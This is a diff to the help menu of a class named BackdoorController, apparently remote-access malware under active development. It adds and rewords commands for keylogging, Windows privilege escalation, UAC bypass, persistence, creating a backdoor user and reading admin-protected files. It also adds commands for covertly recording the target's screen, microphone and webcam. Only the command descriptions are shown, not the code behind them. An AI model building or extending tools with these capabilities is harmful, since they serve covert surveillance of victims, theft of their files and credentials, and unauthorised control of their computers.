@@ -218,12 +218,11 @@ class BackdoorController:
 
         BASIC COMMANDS:
         help                - Show this help message
-        clear               - Clear screen
-        sysinfo             - Get system information
-        cd <directory>      - Change directory on target
+        sysinfo             - Display system information
+        cd <dir>            - Change directory
         download <file>     - Download file from target
         upload <file>       - Upload file to target
-        quit                - Close connection and exit
+        quit                - Exit backdoor
 
         KEYLOGGER:
         keylog_start        - Start keylogger
@@ -234,24 +233,43 @@ class BackdoorController:
         keylog_manual <text> - Manually log text (fallback mode)
 
         PRIVILEGE ESCALATION:
-        priv_check          - Check current privileges
-        priv_enum           - Enumerate privilege escalation vectors
-        priv_services       - List running services
-        priv_tasks          - List scheduled tasks
-        priv_sensitive      - Find sensitive files
+        priv_check          - Check current privileges and user information
+        priv_enum           - Enumerate Windows privilege escalation vectors
+        priv_scan           - Comprehensive escalation scan (all vectors)
+        priv_services       - List running Windows services and permissions
+        priv_tasks          - List Windows scheduled tasks
+        priv_sensitive      - Find sensitive files (credentials, keys, configs)
+        priv_weak_perms     - Find exploitable file permissions
+        priv_uac_bypass     - Attempt UAC bypass (Windows only)
+        priv_dll_hijack     - Find DLL hijacking opportunities (Windows)
+        priv_persist [path] - Create persistence mechanism
+        priv_user [user] [pass] - Create backdoor user (requires admin)
+        priv_read_file <path> - Read admin-protected file (attempts elevation)
+        priv_read_binary <path> - Read admin-protected binary file (base64)
+        priv_list_dir <path> - List admin-protected directory contents
 
         SCREEN & MEDIA:
         screenshot          - Capture single screenshot
         screenshot_multi <count> <interval> - Capture multiple screenshots
         screenshot_list     - List captured screenshots
-        audio_record <sec>  - Record audio (default 10 seconds)
+        
+        audio_start         - Start background audio recording
+        audio_stop          - Stop audio recording and save
+        audio_status        - Check audio recording status
+        audio_record <sec>  - Record audio for specific duration (default 10s)
         audio_list          - List audio recordings
-        record_screen <sec> <fps> - Record screen (default 10s, 15fps)
-        record_start <max>  - Start background recording (max duration in seconds)
-        record_stop         - Stop background recording
-        record_status       - Check recording status
+        
+        record_start <max>  - Start background screen recording (max duration in seconds)
+        record_stop         - Stop screen recording and save
+        record_status       - Check screen recording status
+        record_screen <sec> <fps> - Record screen for specific duration (default 10s, 15fps)
         record_list         - List screen recordings
-        webcam_snap         - Capture webcam image
+        
+        webcam_start        - Start background webcam recording
+        webcam_stop         - Stop webcam recording and save
+        webcam_status       - Check webcam recording status
+        webcam_snap         - Capture single webcam image
+        webcam_list         - List webcam images and videos
 
         NETWORK DISCOVERY:
         net_info            - Display network information
